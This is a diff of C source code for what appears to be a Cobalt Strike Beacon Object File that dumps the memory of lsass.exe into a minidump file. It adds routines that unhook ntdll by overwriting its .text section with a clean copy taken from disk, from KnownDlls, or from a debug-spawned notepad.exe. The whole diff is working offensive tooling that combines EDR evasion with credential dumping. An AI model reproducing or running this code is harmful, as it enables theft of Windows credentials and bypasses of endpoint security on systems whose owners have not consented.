@@ -5,6 +5,20 @@
 #define MAX_MODULES 1024
 #define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 #define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)
+#define SECTION_MAP_READ 0x0004
+#define OBJ_CASE_INSENSITIVE 0x00000040
+#define process_basic_information_size 48
+#define peb_offset 0x8
+#define ldr_offset 0x18
+#define inInitializationOrderModuleList_offset 0x30
+#define ProcessBasicInformation 0
+#define flink_dllbase_offset 0x20
+#define flink_buffer_offset 0x50
+#define zero_memory = 0x00000008
+#define max_string_length 1024
+#define commandline_offset 0x68
+#define processparameters_offset 0x20
+#define flink_buffer_fulldllname_offset 0x40
 
 
 // Structs
@@ -36,6 +50,21 @@ typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved3;
 } PROCESS_BASIC_INFORMATION;
 
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
 
 // Functions
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);
@@ -46,6 +75,7 @@ DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE, ULONG, PV
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtGetNextProcess(HANDLE, ACCESS_MASK, ULONG, ULONG, PHANDLE);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory( HANDLE, PVOID, LPVOID, PVOID, SIZE_T, PSIZE_T);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
 
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
@@ -54,23 +84,35 @@ DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, 
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DebugActiveProcessStop(DWORD);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
 
 
-// Constants
-const int zero_memory = 0x00000008;
-const int max_string_length = 1024;
-const int peb_offset = 0x8;
-const int commandline_offset = 0x68;
-const int processparameters_offset = 0x20;
-const int process_basic_information_size = 48;
-const int ldr_offset = 0x18;
-const int inInitializationOrderModuleList_offset = 0x30;
-const int flink_dllbase_offset = 0x20;
-const int flink_buffer_fulldllname_offset = 0x40;
-const int flink_buffer_offset = 0x50;
-const ULONG ProcessBasicInformation = 0;
+void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a) {
+    p->Length = sizeof(OBJECT_ATTRIBUTES);
+    p->RootDirectory = NULL;
+    p->Attributes = a;
+    p->ObjectName = n;
+    p->SecurityDescriptor = NULL;
+    p->SecurityQualityOfService = NULL;
+}
+
+UNICODE_STRING InitUnicodeString(LPCWSTR str) {
+    UNICODE_STRING us;
+    int data_len = MyWcsLen(str);
+    us.Buffer = (PWSTR)str;
+    us.Length = data_len * sizeof(WCHAR); // Using lstrlenW for length
+    us.MaximumLength = us.Length + sizeof(WCHAR);
+    return us;
+}
 
 
+//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
 PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
     HANDLE hHeap = KERNEL32$GetProcessHeap();
     PVOID buff = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 8);
@@ -120,6 +162,320 @@ char* ReadRemoteWStr(HANDLE hProcess, PVOID mem_address) {
     KERNEL32$HeapFree(hHeap, 0, buff);
     return ansiStr;
 }
+
+
+int MyWcsLen(LPCWSTR str) {
+    int len = 0;
+    while (str[len] != '\0') {
+        len++;
+    }
+    return len;
+}
+
+
+void *MyMemSet(void *ptr, int value, size_t num) {
+    unsigned char *p = (unsigned char *)ptr;
+    while (num--) {
+        *p++ = (unsigned char)value;
+    }
+    return ptr;
+}
+
+
+void* GetModuleAddr() {
+    HANDLE process_handle = (HANDLE) -1;
+    
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    PVOID pbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, process_basic_information_size);
+    if (pbi_addr == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
+        return "";
+    }
+
+    ULONG returnLength = 0;
+    NTSTATUS ntstatus = NTDLL$NtQueryInformationProcess(process_handle, ProcessBasicInformation, pbi_addr, process_basic_information_size, &returnLength);
+    if (ntstatus != 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x%08X\n", ntstatus);
+        return;
+    }
+
+    // PEB
+    PVOID peb_pointer = (PVOID)((BYTE*)pbi_addr + peb_offset);
+    PVOID pebaddress = *(PVOID*)peb_pointer;
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] PEB Address: \t\t0x%p\n", pebaddress);
+
+    // PEB->Ldr
+    void* ldr_pointer = (void*)((uintptr_t)pebaddress + ldr_offset);
+    void* ldr_address = ReadRemoteIntPtr(process_handle, ldr_pointer);
+
+    // Ldr->InitializationOrderModuleList
+    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_address + inInitializationOrderModuleList_offset);
+    void* next_flink = ReadRemoteIntPtr(process_handle, InInitializationOrderModuleList);
+    
+    void* dll_base = (void*)1337;
+    while (dll_base != NULL) {
+        next_flink = (void*)((uintptr_t)next_flink - 0x10);
+        // DLL base address
+        dll_base = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
+        // DLL name
+        void* buffer = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + flink_buffer_offset));
+        char* base_dll_name = ReadRemoteWStr(process_handle, buffer);
+        if(MyStrCmp(base_dll_name, "ntdll.dll") == 0){
+            return dll_base;
+        }
+        // DLL full path
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] base_dll_name %s\n", base_dll_name); 
+        next_flink = ReadRemoteIntPtr(process_handle, (void*)((uintptr_t)next_flink + 0x10));
+    }
+    return 0;
+}
+
+
+int* GetTextSectionInfo(LPVOID ntdll_address) {
+    SIZE_T bytesRead;
+    HANDLE hProcess = (HANDLE) -1;
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll_addr: \t\t0x%p\n", ntdll_address);
+
+    // Read e_lfanew (4 bytes) at offset 0x3C
+    DWORD e_lfanew;
+    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + 0x3C, &e_lfanew, 4, &bytesRead) || bytesRead != 4) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading e_lfanew\n");
+    }
+
+    // Read SizeOfCode (4 bytes)
+    DWORD sizeofcode;
+    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 4, &sizeofcode, 4, &bytesRead) || bytesRead != 4) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading SizeOfCode\n");
+    }
+
+    // Read BaseOfCode (4 bytes)
+    DWORD baseofcode;
+    if (!KERNEL32$ReadProcessMemory(hProcess, (BYTE*)ntdll_address + e_lfanew + 24 + 20, &baseofcode, 4, &bytesRead) || bytesRead != 4) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading BaseOfCode\n");
+    }
+
+    // Return BaseOfCode and SizeOfCode as an array
+    static int result[2];
+    result[0] = baseofcode;
+    result[1] = sizeofcode;
+
+    return result;
+}
+
+
+LPVOID MapNtdllFromDisk(const char* ntdll_path) {
+    HANDLE hFile = KERNEL32$CreateFileA(ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileA\n");
+    }
+
+    // CreateFileMappingA
+    HANDLE hSection = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
+    if (hSection == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CreateFileMappingA\n");
+        KERNEL32$CloseHandle(hFile);
+    }
+
+    // MapViewOfFile
+    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
+    if (pNtdllBuffer == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
+        KERNEL32$CloseHandle(hSection);
+        KERNEL32$CloseHandle(hFile);
+    }
+
+    // Close handles
+    if (!KERNEL32$CloseHandle(hFile) || !KERNEL32$CloseHandle(hSection)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling CloseHandle\n");
+    }
+
+    return pNtdllBuffer;
+}
+
+
+LPVOID MapNtdllFromKnownDlls() {
+    LPCWSTR dll_name = L"\\KnownDlls\\ntdll.dll";
+    UNICODE_STRING us;
+    us = InitUnicodeString(dll_name);
+
+    // Initialize OBJECT_ATTRIBUTES for the section object
+    OBJECT_ATTRIBUTES obj_attr;
+    InitializeObjectAttributes(&obj_attr, &us, OBJ_CASE_INSENSITIVE);
+
+    // Open the section for the DLL
+    HANDLE hSection = NULL;
+    NTSTATUS status = NTDLL$NtOpenSection(&hSection, SECTION_MAP_READ, &obj_attr);
+    if (status != 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtOpenSection. NTSTATUS: 0x%X\n", status);
+    }
+
+    // Map the section into memory
+    LPVOID pNtdllBuffer = KERNEL32$MapViewOfFile(hSection, SECTION_MAP_READ, 0, 0, 0);
+    if (pNtdllBuffer == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling MapViewOfFile\n");
+        NTDLL$NtClose(hSection);
+    }
+
+    // Close the section handle
+    status = NTDLL$NtClose(hSection);
+    if (status != 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[-] Error calling NtClose. NTSTATUS: 0x%X\n", status);
+    }
+
+    return pNtdllBuffer;
+}
+
+
+// Translated function
+LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    BOOL createprocess_res;
+
+    // Initialize structures
+    MyMemSet(&si, 0, sizeof(si));
+    si.cb = sizeof(STARTUPINFOA);
+    MyMemSet(&pi, 0, sizeof(pi));
+
+    // Create process with DEBUG_PROCESS flag
+    createprocess_res = KERNEL32$CreateProcessA(
+        process_path,
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        DEBUG_PROCESS,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+
+    if (!createprocess_res) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CreateProcess\n");
+    }
+
+    void* localNtdllHandle = GetModuleAddr();
+    int* result = GetTextSectionInfo(localNtdllHandle);
+    int localNtdllTxtBase = result[0];
+    int localNtdllTxtSize = result[1];
+    LPVOID localNtdllTxt = (LPVOID)((DWORD_PTR)localNtdllHandle + localNtdllTxtBase);
+
+    // Allocate memory for the buffer to hold the ntdll text section
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    BYTE* ntdllBuffer = (BYTE*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, localNtdllTxtSize);
+    
+    if (!ntdllBuffer) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error allocating memory for ntdll buffer\n");
+    }
+
+    // Read the ntdll text section from the target process
+    SIZE_T bytesRead;
+    BOOL readprocmem_res = KERNEL32$ReadProcessMemory(
+        pi.hProcess,
+        localNtdllTxt,
+        ntdllBuffer,
+        localNtdllTxtSize,
+        &bytesRead
+    );
+
+    if (!readprocmem_res || bytesRead != localNtdllTxtSize) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading process memory\n");
+        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
+    }
+
+    LPVOID pNtdllBuffer = (LPVOID)ntdllBuffer;
+
+    // Stop debugging the process and terminate it
+    BOOL debugstop_res = KERNEL32$DebugActiveProcessStop(pi.dwProcessId);
+    BOOL terminateproc_res = KERNEL32$TerminateProcess(pi.hProcess, 0);
+    if (!debugstop_res || !terminateproc_res) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling DebugActiveProcessStop or TerminateProcess\n");
+        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
+    }
+
+    // Close process and thread handles
+    BOOL closehandle_proc = KERNEL32$CloseHandle(pi.hProcess);
+    BOOL closehandle_thread = KERNEL32$CloseHandle(pi.hThread);
+    if (!closehandle_proc || !closehandle_thread) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Error calling CloseHandle\n");
+        KERNEL32$HeapFree(hHeap, 0, ntdllBuffer);
+    }
+
+    return pNtdllBuffer;
+}
+
+
+void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
+    DWORD dwOldProtection;
+
+    // Change protection to PAGE_EXECUTE_WRITECOPY
+    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
+        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (PAGE_EXECUTE_WRITECOPY)\n");
+        return;  // Exit function on failure
+    }
+    
+    // Manually copy the memory (replace memcpy)
+    unsigned char *src = (unsigned char *)unhookedNtdllTxt;
+    unsigned char *dst = (unsigned char *)localNtdllTxt;
+    for (SIZE_T i = 0; i < localNtdllTxtSize; i++) {
+        dst[i] = src[i];
+    }
+
+    // Restore original memory protection
+    if (!KERNEL32$VirtualProtect(localNtdllTxt, localNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
+        BeaconPrintf(CALLBACK_ERROR, "Error calling VirtualProtect (dwOldProtection)\n");
+        return;
+
+    }
+}
+
+
+void ReplaceLibrary(const char* option){
+    long long unhookedNtdllTxt = 0;
+    LPVOID unhookedNtdllHandle;
+    const int offset_mappeddll = 4096;
+
+    if (MyStrCmp(option, "disk") == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: disk\n");
+        const char* ntdll_path = "C:\\Windows\\System32\\ntdll.dll";
+        unhookedNtdllHandle = MapNtdllFromDisk(ntdll_path);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
+        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+    }
+    else if (MyStrCmp(option, "knowndlls") == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: knowndlls\n");
+        unhookedNtdllHandle = MapNtdllFromKnownDlls();
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllHandle: \t0x%p\n", unhookedNtdllHandle);
+        unhookedNtdllTxt = unhookedNtdllHandle + offset_mappeddll;
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+
+    }
+    else if (MyStrCmp(option, "debugproc") == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Option: debugproc\n");
+        const char* proc_path = "c:\\Windows\\System32\\notepad.exe";     
+        unhookedNtdllTxt = MapNtdllFromDebugProc(proc_path);
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] unhookedNtdllTxt:    \t0x%p\n", unhookedNtdllTxt);
+    }
+    else{
+        return;
+    }
+
+    // Replace
+    void* localNtdllHandle = GetModuleAddr();
+    int* textSectionInfo = GetTextSectionInfo(localNtdllHandle);
+    int localNtdllTxtBase = textSectionInfo[0];
+    int localNtdllTxtSize = textSectionInfo[1];
+    long long localNtdllTxt = (long long)localNtdllHandle + localNtdllTxtBase;
+
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtBase: \t\t0x%p\n", localNtdllTxtBase);
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] localNtdllTxtSize: \t\t0x%p\n", localNtdllTxtSize);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying %d bytes from 0x%p to 0x%p.\n", localNtdllTxtSize, unhookedNtdllTxt, localNtdllTxt);
+
+    ReplaceNtdllTxtSection((LPVOID)unhookedNtdllTxt, (LPVOID)localNtdllTxt, localNtdllTxtSize);
+}
+//////////////////////////////////////////////////////////////////////////////////////////////// Ntdll overwrite ////////////////////////////////////////////////////////////////////////////////////////////////
 
 
 void EnableDebugPrivileges() {
@@ -407,7 +763,7 @@ MemFile* ReadMemReg(HANDLE hProcess, int* memfile_countOutput){
 }
 
     
-ModuleInformation* GetModuleInfo(char* filename, HANDLE* hProcessOutput, int* module_counterOutput){
+ModuleInformation* GetModuleInfo(HANDLE* hProcessOutput, int* module_counterOutput){
     // Process handle
     EnableDebugPrivileges();
     HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
@@ -459,7 +815,7 @@ ModuleInformation* GetModuleInfo(char* filename, HANDLE* hProcessOutput, int* mo
 }
 
 
-OSVERSIONINFOW GetOSInfo(char* filename){
+OSVERSIONINFOW GetOSInfo(){
     OSVERSIONINFOW osvi;
     NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
     if (status == 0) {
@@ -469,21 +825,12 @@ OSVERSIONINFOW GetOSInfo(char* filename){
 }
 
 
-void my_memcpy(void *dest, const void *src, size_t len) {
+void MyMemCpy(void *dest, const void *src, size_t len) {
     char *d = (char*)dest;
     const char *s = (const char*)src;
     while (len--) {
         *d++ = *s++;
     }
-}
-
-
-void *my_memset(void *ptr, int value, size_t num) {
-    unsigned char *p = (unsigned char *)ptr;
-    while (num--) {
-        *p++ = (unsigned char)value;
-    }
-    return ptr;
 }
 
 
@@ -518,24 +865,22 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
     *(int*)modulelist_sizeByteSlice = modulelist_size;
     *(int*)mem64list_sizeByteSlice = mem64list_size;
     *(int*)mem64list_offsetByteSlice = mem64list_offset;
-
     char stream_directory[36];
-    char data1[] = { 0x04, 0x00, 0x00, 0x00 }; // Stream 1
+    char data1[] = { 0x04, 0x00, 0x00, 0x00 };
     char data2[] = { 0x7c, 0x00, 0x00, 0x00 };
-    char data3[] = { 0x07, 0x00, 0x00, 0x00 }; // Stream 2
+    char data3[] = { 0x07, 0x00, 0x00, 0x00 };
     char data4[] = { 0x38, 0x00, 0x00, 0x00 };
     char data5[] = { 0x44, 0x00, 0x00, 0x00 };
-    char data6[] = { 0x09, 0x00, 0x00, 0x00 }; // Stream 3
-
-    my_memcpy(stream_directory, data1, 4);
-    my_memcpy(stream_directory + 4, modulelist_sizeByteSlice, 4);
-    my_memcpy(stream_directory + 8, data2, 4);
-    my_memcpy(stream_directory + 12, data3, 4);
-    my_memcpy(stream_directory + 16, data4, 4);
-    my_memcpy(stream_directory + 20, data5, 4);
-    my_memcpy(stream_directory + 24, data6, 4);
-    my_memcpy(stream_directory + 28, mem64list_sizeByteSlice, 4);
-    my_memcpy(stream_directory + 32, mem64list_offsetByteSlice, 4);
+    char data6[] = { 0x09, 0x00, 0x00, 0x00 };
+    MyMemCpy(stream_directory, data1, 4);
+    MyMemCpy(stream_directory + 4, modulelist_sizeByteSlice, 4);
+    MyMemCpy(stream_directory + 8, data2, 4);
+    MyMemCpy(stream_directory + 12, data3, 4);
+    MyMemCpy(stream_directory + 16, data4, 4);
+    MyMemCpy(stream_directory + 20, data5, 4);
+    MyMemCpy(stream_directory + 24, data6, 4);
+    MyMemCpy(stream_directory + 28, mem64list_sizeByteSlice, 4);
+    MyMemCpy(stream_directory + 32, mem64list_offsetByteSlice, 4);
 
     // SystemInfoStream
     char systeminfostream[56] = { 0 };
@@ -543,10 +888,10 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
     int majorVersion = osvi.dwMajorVersion;
     int minorVersion = osvi.dwMinorVersion;
     int buildNumber =  osvi.dwBuildNumber;
-    my_memcpy(systeminfostream, &processor_architecture, 4);
-    my_memcpy(systeminfostream + 8, &majorVersion, 4);
-    my_memcpy(systeminfostream + 12, &minorVersion, 4);
-    my_memcpy(systeminfostream + 16, &buildNumber, 4);
+    MyMemCpy(systeminfostream, &processor_architecture, 4);
+    MyMemCpy(systeminfostream + 8, &majorVersion, 4);
+    MyMemCpy(systeminfostream + 12, &minorVersion, 4);
+    MyMemCpy(systeminfostream + 16, &buildNumber, 4);
 
     // ModuleListStream
     int pointer_index = 0x7c + 4 + (108 * number_modules);
@@ -559,14 +904,14 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
     for (int i = 0; i < moduleinfo_len; i++) {
         long long baseAddress = (long long) moduleinfo_arr[i].dll_base;
         long long size = (long long)moduleinfo_arr[i].size; 
-        my_memcpy(modulelist_stream + modulelist_stream_offset, &baseAddress, 8); // Base Address
+        MyMemCpy(modulelist_stream + modulelist_stream_offset, &baseAddress, 8); // Base Address
         modulelist_stream_offset += 8;
-        my_memcpy(modulelist_stream + modulelist_stream_offset, &size, 8); // Size
+        MyMemCpy(modulelist_stream + modulelist_stream_offset, &size, 8); // Size
         modulelist_stream_offset += 12;
         *(long long*)(modulelist_stream + modulelist_stream_offset) = pointer_index; // Offset
         modulelist_stream_offset += 8;
         pointer_index += (MyStrLen(moduleinfo_arr[i].full_dll_path) * 2 + 8); // Adjust pointer
-        my_memset(modulelist_stream + modulelist_stream_offset, 0, 80); // 80 zeros
+        MyMemSet(modulelist_stream + modulelist_stream_offset, 0, 80); // 80 zeros
         modulelist_stream_offset += 80;
     }
 
@@ -578,13 +923,13 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
         char* unicode_bytearr = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, full_path_length * 2);
         for (int j = 0; j < full_path_length; j++) {
             short utf16_val = (short)full_path[j];  // Simple conversion, replace with actual UTF-16 encoding if needed.
-            my_memcpy(unicode_bytearr + j * 2, &utf16_val, 2);
+            MyMemCpy(unicode_bytearr + j * 2, &utf16_val, 2);
         }
-        my_memcpy(modulelist_stream + modulelist_stream_offset, &full_path_unicode_size, 4);
+        MyMemCpy(modulelist_stream + modulelist_stream_offset, &full_path_unicode_size, 4);
         modulelist_stream_offset += 4;
-        my_memcpy(modulelist_stream + modulelist_stream_offset, unicode_bytearr, full_path_length * 2);
+        MyMemCpy(modulelist_stream + modulelist_stream_offset, unicode_bytearr, full_path_length * 2);
         modulelist_stream_offset += full_path_length * 2;
-        my_memset(modulelist_stream + modulelist_stream_offset, 0, 4);
+        MyMemSet(modulelist_stream + modulelist_stream_offset, 0, 4);
         modulelist_stream_offset += 4;
         KERNEL32$HeapFree(hHeap, 0, unicode_bytearr);
     }
@@ -599,9 +944,9 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
     for (int i = 0; i < mem64list_len; i++) {
         long long address = (long long)mem64list_arr[i].address;
         long long size = mem64list_arr[i].size;
-        my_memcpy(memory64list_stream + memory64list_stream_offset, &address, 8);
+        MyMemCpy(memory64list_stream + memory64list_stream_offset, &address, 8);
         memory64list_stream_offset += 8;
-        my_memcpy(memory64list_stream + memory64list_stream_offset, &size, 8);
+        MyMemCpy(memory64list_stream + memory64list_stream_offset, &size, 8);
         memory64list_stream_offset += 8;
     }
 
@@ -619,10 +964,10 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
             concatenated_content = NULL;
         }
         if (concatenated_content != NULL) {
-            my_memcpy(new_block, concatenated_content, memoryRegions_len);
+            MyMemCpy(new_block, concatenated_content, memoryRegions_len);
             KERNEL32$HeapFree(hHeap, 0, concatenated_content);
         }
-        my_memcpy(new_block + memoryRegions_len, content, size);
+        MyMemCpy(new_block + memoryRegions_len, content, size);
         concatenated_content = new_block;
         memoryRegions_len += size;
     }
@@ -633,17 +978,17 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
     
     char* dump_file_bytes = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dump_file_size);
     int dump_file_offset = 0;
-    my_memcpy(dump_file_bytes + dump_file_offset, header, 32); // Header
+    MyMemCpy(dump_file_bytes + dump_file_offset, header, 32); // Header
     dump_file_offset += 32;
-    my_memcpy(dump_file_bytes + dump_file_offset, stream_directory, 36); // Stream directory
+    MyMemCpy(dump_file_bytes + dump_file_offset, stream_directory, 36); // Stream directory
     dump_file_offset += 36;    
-    my_memcpy(dump_file_bytes + dump_file_offset, systeminfostream, 56); // SystemInfoStream
+    MyMemCpy(dump_file_bytes + dump_file_offset, systeminfostream, 56); // SystemInfoStream
     dump_file_offset += 56;    
-    my_memcpy(dump_file_bytes + dump_file_offset, modulelist_stream, modulelist_size); // ModuleListStream
+    MyMemCpy(dump_file_bytes + dump_file_offset, modulelist_stream, modulelist_size); // ModuleListStream
     dump_file_offset += modulelist_size;    
-    my_memcpy(dump_file_bytes + dump_file_offset, memory64list_stream, mem64list_size); // Memory64List
+    MyMemCpy(dump_file_bytes + dump_file_offset, memory64list_stream, mem64list_size); // Memory64List
     dump_file_offset += mem64list_size; 
-    my_memcpy(dump_file_bytes + dump_file_offset, concatenated_content, memoryRegions_len); // Memory regions
+    MyMemCpy(dump_file_bytes + dump_file_offset, concatenated_content, memoryRegions_len); // Memory regions
     
     // Free memory
     KERNEL32$HeapFree(hHeap, 0, modulelist_stream);
@@ -655,28 +1000,31 @@ char* get_dump_bytearr(OSVERSIONINFOW osvi, ModuleInformation* moduleinfo_arr, i
 
 
 void go(IN PCHAR Buffer, IN ULONG Length) {
+    // Get first argument value
+    //      - disk:        0e0000000a0000006400690073006b000000
+    //      - knowndlls:   18000000140000006b006e006f0077006e0064006c006c0073000000
+    //      - debugproc:   180000001400000064006500620075006700700072006f0063000000
     datap parser;
-    wchar_t *fname_w = NULL;
+    wchar_t *option_w = NULL;
     BeaconDataParse(&parser, Buffer, Length);
-    fname_w = (wchar_t *)BeaconDataExtract(&parser, NULL);
+    option_w = (wchar_t *)BeaconDataExtract(&parser, NULL);
     HANDLE hHeap = KERNEL32$GetProcessHeap();
-    char* fname = "oogie.dmp";
-    if(fname_w != NULL){
-        fname = ConvertUnicodeToAnsi(hHeap, fname_w);
+    char* option = "";
+    if(option_w != NULL){
+        option = ConvertUnicodeToAnsi(hHeap, option_w);
     }
+    ReplaceLibrary(option);
 
     // File names
-    char* filename_lock   = "lock.json";
-    char* filename_shock  = "shock.json";
-    char* filename_barrel = "barrel.json";    
+    char* dump_fname = "oogie.dmp";    
 
     // OS Information (Lock)
-    OSVERSIONINFOW osvi = GetOSInfo(filename_lock);
+    OSVERSIONINFOW osvi = GetOSInfo();
 
     // Get Modules Information (Shock)    
     HANDLE hProcess;
     int moduleInformationList_len = 0;
-    ModuleInformation* moduleInformationList = GetModuleInfo(filename_shock, &hProcess, &moduleInformationList_len);
+    ModuleInformation* moduleInformationList = GetModuleInfo(&hProcess, &moduleInformationList_len);
 
     // Dump memory regions (Barrel)
     int memfile_count = NULL;
@@ -685,5 +1033,5 @@ void go(IN PCHAR Buffer, IN ULONG Length) {
     // Create Minidump
     int dump_len = NULL;
